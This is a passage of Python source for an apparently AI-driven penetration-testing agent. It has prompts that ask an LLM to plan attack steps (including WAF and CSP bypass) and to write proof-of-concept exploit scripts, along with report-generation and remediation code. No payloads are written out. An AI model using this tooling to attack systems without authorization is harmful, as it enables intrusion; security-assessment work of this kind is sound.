   - What's the worst-case scenario?
   - Compliance implications (PCI-DSS, GDPR, etc.)

5. **Proof of Concept:** Working Python script that:
   - Uses the requests library
   - Demonstrates the vulnerability
   - Includes comments explaining each step

6. **Remediation:** Specific, actionable steps:
   - Code-level fixes (with examples)
   - Framework/library recommendations
   - Defense-in-depth measures

7. **References:** Include links to:
   - OWASP guidance
   - CWE/CVE if applicable
   - Vendor documentation

Respond in JSON format:
{{
    "cvss_score": 8.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe_id": "CWE-89",
    "description": "A SQL injection vulnerability...",
    "impact": "An attacker could...",
    "poc_code": "import requests\\n\\n# PoC for SQL Injection\\n...",
    "remediation": "1. Use parameterized queries...\\n2. Implement input validation...",
    "references": ["https://owasp.org/Top10/A03_2021-Injection/", "https://cwe.mitre.org/data/definitions/89.html"]
}}"""

        try:
            system = self._get_enhanced_system_prompt("reporting", vuln_type=finding.vulnerability_type)
            response = await self.llm.generate(prompt, system)
            match = re.search(r'\{.*\}', response, re.DOTALL)
            if match:
                return json.loads(match.group())
        except Exception as e:
            await self.log("debug", f"AI enhance error: {e}")

        return {}

    # ==================== PROMPT-ONLY MODE ====================

    async def _run_prompt_only(self) -> Dict:
        """Prompt-only mode - AI decides everything"""
        await self.log("warning", "PROMPT-ONLY MODE: AI will decide what tools to use")
        await self.log("warning", "This mode uses more tokens than other modes")
        await self._update_progress(0, "AI Planning")

        prompt = self.custom_prompt or (self.task.prompt if hasattr(self.task, 'prompt') else "")
        if not prompt:
            prompt = DEFAULT_ASSESSMENT_PROMPT

        # Phase 1: AI Planning
        await self.log("info", "[PHASE 1/4] AI Planning")
        plan = await self._ai_create_plan(prompt)
        await self._update_progress(25, "Plan created")

        # Phase 2: Execute Plan
        await self.log("info", "[PHASE 2/4] Executing Plan")
        for step in plan.get("steps", ["recon", "test", "report"]):
            await self.log("info", f"  Executing: {step}")
            await self._execute_plan_step(step)
        await self._update_progress(70, "Plan executed")

        # Phase 3: Analyze Results
        await self.log("info", "[PHASE 3/4] Analyzing Results")
        await self._ai_enhance_findings()
        await self._update_progress(85, "Analysis complete")

        # Phase 4: Generate Report
        await self.log("info", "[PHASE 4/4] Generating Report")
        report = await self._generate_full_report()
        await self._update_progress(100, "Complete")

        return report

    async def _ai_create_plan(self, prompt: str) -> Dict:
        """AI creates execution plan"""
        if not self.llm.is_available():
            return {"steps": ["recon", "test", "report"]}

        system = """You are an autonomous penetration testing agent. Your role is to:
1. Understand the user's security testing request
2. Create an efficient, targeted testing plan
3. Ensure thorough coverage while avoiding redundant testing

Always start with reconnaissance unless already done, and always end with report generation."""

        plan_prompt = f"""**Security Testing Request:**
User Request: {prompt}
Target: {self.target}

**Available Actions (predefined):**
- recon: Discover endpoints, parameters, forms, and technologies
- scan_sqli: Test for SQL injection
- scan_xss: Test for Cross-Site Scripting
- scan_lfi: Test for Local File Inclusion / Path Traversal
- scan_ssti: Test for Server-Side Template Injection
- scan_ssrf: Test for Server-Side Request Forgery
- clickjacking: Test for Clickjacking
- security_headers: Test security headers
- cors: Test for CORS misconfigurations
- scan_all: Comprehensive vulnerability testing
- report: Generate final assessment report

**IMPORTANT: You can also use ANY custom vulnerability type as a step!**
For vulnerabilities not in the predefined list, just use the vulnerability name as the step.
The AI will dynamically generate tests for it.

Examples of custom steps you can use:
- "xxe" - XML External Entity injection
- "race_condition" - Race condition testing
- "rate_limit_bypass" - Rate limiting bypass
- "jwt_vulnerabilities" - JWT security issues
- "bola" - Broken Object Level Authorization
- "bfla" - Broken Function Level Authorization
- "graphql_injection" - GraphQL specific attacks
- "nosql_injection" - NoSQL injection
- "waf_bypass" - WAF bypass techniques
- "csp_bypass" - CSP bypass techniques
- "prototype_pollution" - Prototype pollution
- "deserialization" - Insecure deserialization
- "mass_assignment" - Mass assignment vulnerabilities
- "business_logic" - Business logic flaws
- Any other vulnerability type you can think of!

**Planning Guidelines:**
1. Start with 'recon' to gather information
2. Add steps based on user request - use predefined OR custom vulnerability names
3. Always end with 'report'

**Examples:**
- "Test for XXE" → {{"steps": ["recon", "xxe", "report"]}}
- "Check race conditions and rate limiting" → {{"steps": ["recon", "race_condition", "rate_limit_bypass", "report"]}}
- "Test BOLA and BFLA" → {{"steps": ["recon", "bola", "bfla", "report"]}}
- "Full API security test" → {{"steps": ["recon", "bola", "bfla", "jwt_vulnerabilities", "mass_assignment", "report"]}}
- "WAF bypass and XSS" → {{"steps": ["recon", "waf_bypass", "scan_xss", "report"]}}

Respond with your execution plan in JSON format:
{{"steps": ["action1", "action2", ...]}}"""

        try:
            response = await self.llm.generate(plan_prompt, self._get_enhanced_system_prompt("strategy"))
            match = re.search(r'\{.*\}', response, re.DOTALL)
            if match:
                return json.loads(match.group())
        except:
            pass

        # Fallback: parse prompt keywords to determine steps
        # This fallback now supports ANY vulnerability type via AI dynamic testing
        prompt_lower = prompt.lower()
        steps = ["recon"]

        # Known vulnerability mappings
        vuln_mappings = {
            # Predefined tests
            "clickjack": "clickjacking", "x-frame": "clickjacking", "framing": "clickjacking",
            "security header": "security_headers",
            "cors": "cors",
            "sqli": "scan_sqli", "sql injection": "scan_sqli",
            "xss": "scan_xss", "cross-site script": "scan_xss",
            "lfi": "scan_lfi", "file inclusion": "scan_lfi", "path traversal": "scan_lfi",
            "ssti": "scan_ssti", "template injection": "scan_ssti",
            "ssrf": "scan_ssrf",
            # Advanced vulnerabilities - will use AI dynamic testing
            "xxe": "xxe", "xml external": "xxe",
            "race condition": "race_condition", "race": "race_condition",
            "rate limit": "rate_limit_bypass", "rate-limit": "rate_limit_bypass",
            "bola": "bola", "broken object": "bola",
            "bfla": "bfla", "broken function": "bfla",
            "idor": "idor", "insecure direct": "idor",
            "jwt": "jwt_vulnerabilities",
            "graphql": "graphql_injection",
            "nosql": "nosql_injection",
            "waf bypass": "waf_bypass", "waf": "waf_bypass",
            "csp bypass": "csp_bypass",
            "prototype pollution": "prototype_pollution",
            "deserialization": "deserialization", "deserial": "deserialization",
            "mass assignment": "mass_assignment",
            "business logic": "business_logic",
            "open redirect": "open_redirect",
            "subdomain takeover": "subdomain_takeover",
            "host header": "host_header_injection",
            "cache poison": "cache_poisoning",
            "http smuggling": "http_smuggling", "request smuggling": "http_smuggling",
            "web cache": "cache_poisoning",
            "parameter pollution": "parameter_pollution", "hpp": "parameter_pollution",
            "type juggling": "type_juggling",
            "timing attack": "timing_attack",
            "command injection": "command_injection", "rce": "command_injection",
        }

        matched_steps = set()
        for keyword, step in vuln_mappings.items():
            if keyword in prompt_lower:
                matched_steps.add(step)

        if matched_steps:
            steps.extend(list(matched_steps))
        else:
            # No known keywords matched - pass the entire prompt as a custom step
            # The AI dynamic testing will handle it
            custom_step = prompt.strip()[:100]  # Limit length
            if custom_step and custom_step.lower() not in ["test", "scan", "check", "find"]:
                steps.append(custom_step)
            else:
                steps.append("scan_all")

        steps.append("report")
        return {"steps": steps}

    async def _execute_plan_step(self, step: str):
        """Execute a plan step - supports ANY vulnerability type via AI dynamic testing"""
        step_lower = step.lower()
        await self.log("debug", f"Executing plan step: {step}")

        # Known vulnerability types with predefined tests
        if "recon" in step_lower or "information" in step_lower or "discovery" in step_lower:
            await self._run_recon_only()
        elif "scan_all" in step_lower:
            await self._test_all_vulnerabilities(self._default_attack_plan())
        elif "sqli" in step_lower or "sql injection" in step_lower:
            await self._test_all_vulnerabilities({"priority_vulns": ["sqli"]})
        elif "xss" in step_lower or "cross-site script" in step_lower:
            await self._test_all_vulnerabilities({"priority_vulns": ["xss"]})
        elif "lfi" in step_lower or "local file" in step_lower or "path traversal" in step_lower:
            await self._test_all_vulnerabilities({"priority_vulns": ["lfi"]})
        elif "ssti" in step_lower or "template injection" in step_lower:
            await self._test_all_vulnerabilities({"priority_vulns": ["ssti"]})
        elif "ssrf" in step_lower or "server-side request" in step_lower:
            await self._test_all_vulnerabilities({"priority_vulns": ["ssrf"]})
        elif "clickjack" in step_lower or "x-frame" in step_lower or "framing" in step_lower:
            await self.log("info", "  Testing for clickjacking/X-Frame-Options")
            await self._test_security_headers("clickjacking")
        elif "security_header" in step_lower or ("header" in step_lower and "security" in step_lower):
            await self.log("info", "  Testing security headers")
            await self._test_security_headers("all")
        elif "cors" in step_lower:
            await self.log("info", "  Testing CORS configuration")
            await self._test_cors()
        elif "info_disclos" in step_lower or ("information" in step_lower and "disclosure" in step_lower):
            await self.log("info", "  Testing for information disclosure")
            await self._test_information_disclosure()
        elif "report" in step_lower or "document" in step_lower:
            await self.log("info", "  Report will be generated at the end")
        else:
            # AI DYNAMIC TESTING - handles ANY vulnerability type!
            # Examples: XXE, Race Condition, Rate Limiting, BOLA, BFLA, JWT, GraphQL,
            # NoSQL Injection, WAF Bypass, CSP Bypass, Prototype Pollution, etc.
            await self.log("info", f"  [AI] Dynamic testing for: {step}")
            await self._ai_dynamic_test(step)

    # ==================== ANALYZE-ONLY MODE ====================

    async def _run_analyze_only(self) -> Dict:
        """Analyze-only mode"""
        await self.log("info", "ANALYZE-ONLY MODE: No active testing")
        await self._update_progress(0, "Starting analysis")

        # Load any provided context
        if self.recon_context:
            await self.log("info", "[PHASE 1/2] Loading context")
            self._load_context()
        else:
            await self.log("info", "[PHASE 1/2] Passive reconnaissance")
            await self._initial_probe()

        await self._update_progress(50, "Context loaded")

        # AI Analysis
        await self.log("info", "[PHASE 2/2] AI Analysis")
        analysis = await self._ai_passive_analysis()
        await self._update_progress(100, "Analysis complete")

        return {
            "type": "analysis_only",
            "target": self.target,
            "mode": self.mode.value,
            "scan_date": datetime.utcnow().isoformat(),
            "analysis": analysis,
            "recon": {
                "endpoints": len(self.recon.endpoints),
                "technologies": self.recon.technologies
            },
            "findings": [],
            "recommendations": ["Perform active testing for complete assessment"]
        }

    def _load_context(self):
        """Load recon context"""
        if not self.recon_context:
            return
        data = self.recon_context.get("data", {})
        self.recon.endpoints = [{"url": e} for e in data.get("endpoints", [])]
        self.recon.technologies = data.get("technologies", [])

    async def _ai_passive_analysis(self) -> str:
        """AI passive analysis"""
        if not self.llm.is_available():
            return "LLM not available for analysis"

        context = f"""Target: {self.target}
Endpoints: {[_get_endpoint_url(e) for e in self.recon.endpoints[:20]]}
Technologies: {self.recon.technologies}
Forms: {len(self.recon.forms)}"""

        prompt = f"""Perform a security analysis WITHOUT active testing:

{context}

Analyze and identify:
1. Potential security risks
2. Areas requiring testing
3. Technology-specific concerns
4. Recommendations

Provide your analysis:"""

        try:
            return await self.llm.generate(prompt,
                self._get_enhanced_system_prompt("reporting"))
        except:
            return "Analysis failed"

    # ==================== REPORT GENERATION ====================

    def _generate_recon_report(self) -> Dict:
        """Generate recon report"""
        return {
            "type": "reconnaissance",
            "target": self.target,
            "mode": self.mode.value,
            "scan_date": datetime.utcnow().isoformat(),
            "summary": {
                "target": self.target,
                "endpoints_found": len(self.recon.endpoints),
                "forms_found": len(self.recon.forms),
                "technologies": self.recon.technologies,
            },
            "data": {
                "endpoints": self.recon.endpoints[:50],
                "forms": self.recon.forms[:20],
                "technologies": self.recon.technologies,
                "api_endpoints": self.recon.api_endpoints[:20],
            },
            "findings": [],
            "recommendations": ["Proceed with vulnerability testing"]
        }

    async def _generate_full_report(self) -> Dict:
        """Generate comprehensive report"""
        # Convert findings to dict
        findings_data = []
        for f in self.findings:
            findings_data.append({
                "id": f.id,
                "title": f.title,
                "severity": f.severity,
                "vulnerability_type": f.vulnerability_type,
                "cvss_score": f.cvss_score,
                "cvss_vector": f.cvss_vector,
                "cwe_id": f.cwe_id,
                "description": f.description,
                "affected_endpoint": f.affected_endpoint,
                "parameter": f.parameter,
                "payload": f.payload,
                "evidence": f.evidence,
                "impact": f.impact,
                "poc_code": f.poc_code,
                "remediation": f.remediation,
                "references": f.references,
                "ai_verified": f.ai_verified,
                "confidence": f.confidence,
                "confidence_score": f.confidence_score,
                "confidence_breakdown": getattr(f, "confidence_breakdown", {}),
                "proof_of_execution": getattr(f, "proof_of_execution", ""),
                "ai_status": f.ai_status,
                "rejection_reason": f.rejection_reason,
                "double_checked": getattr(f, "double_checked", False),
                "request": f.request,
                "response": f.response[:2000] if f.response else "",
                "evidence_request": getattr(f, "evidence_request", ""),
                "evidence_response": getattr(f, "evidence_response", "")[:2000],
                "screenshots": f.screenshots,
            })

        # Convert rejected findings to dict
        rejected_data = []
        for f in self.rejected_findings:
            rejected_data.append({
                "id": f.id,
                "title": f.title,
                "severity": f.severity,
                "vulnerability_type": f.vulnerability_type,
                "cvss_score": f.cvss_score,
                "cvss_vector": f.cvss_vector,
                "cwe_id": f.cwe_id,
                "description": f.description,
                "affected_endpoint": f.affected_endpoint,
                "parameter": f.parameter,
                "payload": f.payload,
                "evidence": f.evidence,
                "impact": f.impact,
                "poc_code": f.poc_code,
                "remediation": f.remediation,
                "references": f.references,
                "ai_verified": False,
                "confidence": "low",
                "confidence_score": f.confidence_score,
                "confidence_breakdown": getattr(f, "confidence_breakdown", {}),
                "ai_status": "rejected",
                "rejection_reason": f.rejection_reason,
            })

        # Count by severity
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for f in self.findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1

        # Generate recommendations
        recommendations = self._generate_recommendations()

        report = {
            "type": "full_assessment",
            "target": self.target,
            "mode": self.mode.value,
            "scan_id": self.scan_id,
            "scan_date": datetime.utcnow().isoformat(),
            "duration": "N/A",
            "summary": {
                "target": self.target,
                "mode": self.mode.value,
                "total_findings": len(self.findings),
                "severity_breakdown": severity_counts,
                "endpoints_tested": len(self.recon.endpoints),
                "technologies": self.recon.technologies,
                "risk_level": self._calculate_risk_level(severity_counts),
            },
            "recon": {
                "endpoints": self.recon.endpoints[:200],
                "forms": self.recon.forms[:50],
                "technologies": self.recon.technologies,
                "api_endpoints": getattr(self.recon, "api_endpoints", [])[:50],
            },
            "findings": findings_data,
            "rejected_findings": rejected_data,
            "recommendations": recommendations,
            "executive_summary": await self._generate_executive_summary(findings_data, severity_counts),
            "tool_executions": self.tool_executions,
        }

        # Add autonomy module stats
        if self.request_engine:
            report["request_stats"] = self.request_engine.get_stats()
        if self._waf_result and self._waf_result.detected_wafs:
            report["waf_detection"] = {
                "detected": [{"name": w.name, "confidence": w.confidence, "method": w.detection_method}
                             for w in self._waf_result.detected_wafs],
                "blocking_patterns": self._waf_result.blocking_patterns,
            }
        if self.strategy:
            report["strategy_adaptation"] = self.strategy.get_report_context()
        if self.chain_engine:
            report["exploit_chains"] = self.chain_engine.get_attack_graph()
        if self.auth_manager:
            report["auth_status"] = self.auth_manager.get_auth_summary()

        # Log summary
        await self.log("info", "=" * 60)
        await self.log("info", "ASSESSMENT COMPLETE")
        await self.log("info", f"Total Findings: {len(self.findings)}")
        await self.log("info", f"  Critical: {severity_counts['critical']}")
        await self.log("info", f"  High: {severity_counts['high']}")
        await self.log("info", f"  Medium: {severity_counts['medium']}")
        await self.log("info", f"  Low: {severity_counts['low']}")
        await self.log("info", f"  AI-Rejected (for manual review): {len(self.rejected_findings)}")
        await self.log("info", "=" * 60)

        return report

    async def _generate_executive_summary(self, findings: List, counts: Dict) -> str:
        """Generate executive summary"""
        if not self.llm.is_available() or not findings:
            if counts.get('critical', 0) > 0:
                return f"Critical vulnerabilities found requiring immediate attention. {counts['critical']} critical and {counts['high']} high severity issues identified."
            elif counts.get('high', 0) > 0:
                return f"High severity vulnerabilities found. {counts['high']} high severity issues require prompt remediation."
            else:
                return "Assessment completed. Review findings and implement recommended security improvements."

        # Build finding summary for context
        finding_summary = []
        for f in findings[:5]:
            finding_summary.append(f"- [{f.get('severity', 'unknown').upper()}] {f.get('title', 'Unknown')}")

        risk_level = self._calculate_risk_level(counts)

        prompt = f"""Generate a professional executive summary for this penetration testing report.

**Assessment Overview:**
- Target: {self.target}
- Assessment Type: Automated Security Assessment
- Overall Risk Rating: {risk_level}

**Findings Summary:**
- Total Vulnerabilities: {len(findings)}
- Critical: {counts.get('critical', 0)}
- High: {counts.get('high', 0)}
- Medium: {counts.get('medium', 0)}
- Low: {counts.get('low', 0)}
- Informational: {counts.get('info', 0)}

**Key Findings:**
{chr(10).join(finding_summary) if finding_summary else '- No significant vulnerabilities identified'}

**Required Output:**
Write a 3-4 sentence executive summary that:
1. States the overall security posture (good/needs improvement/critical issues)
2. Highlights the most important finding(s) and their business impact
3. Provides a clear call to action for remediation

Write in a professional, non-technical tone suitable for C-level executives and board members."""

        try:
            return await self.llm.generate(prompt,
                self._get_enhanced_system_prompt("reporting"))
        except:
            return "Assessment completed. Review findings for details."

    def _calculate_risk_level(self, counts: Dict) -> str:
        """Calculate overall risk level"""
        if counts.get("critical", 0) > 0:
            return "CRITICAL"
        elif counts.get("high", 0) > 0:
            return "HIGH"
        elif counts.get("medium", 0) > 0:
            return "MEDIUM"
        elif counts.get("low", 0) > 0:
            return "LOW"
        return "INFO"

    def _generate_recommendations(self) -> List[str]:
        """Generate recommendations"""
        recommendations = []

        vuln_types = set(f.vulnerability_type for f in self.findings)

        if "sqli" in vuln_types:
            recommendations.append("Implement parameterized queries/prepared statements to prevent SQL injection")
        if "xss" in vuln_types:
            recommendations.append("Implement output encoding and Content Security Policy (CSP) headers")
        if "lfi" in vuln_types:
            recommendations.append("Validate and sanitize all file path inputs; implement allowlists")
        if "ssti" in vuln_types:
            recommendations.append("Use logic-less templates or properly sandbox template engines")
        if "ssrf" in vuln_types:
            recommendations.append("Validate and restrict outbound requests; use allowlists for URLs")
        if "rce" in vuln_types:
            recommendations.append("Avoid executing user input; use safe APIs instead of system commands")

        if not recommendations:
            recommendations.append("Continue regular security assessments and penetration testing")
            recommendations.append("Implement security headers (CSP, X-Frame-Options, etc.)")
            recommendations.append("Keep all software and dependencies up to date")

        return recommendations

    def _generate_error_report(self, error: str) -> Dict:
        """Generate error report"""
        return {
            "type": "error",
            "target": self.target,
            "mode": self.mode.value,
            "error": error,
            "findings": [],
            "summary": {"error": error}
        }
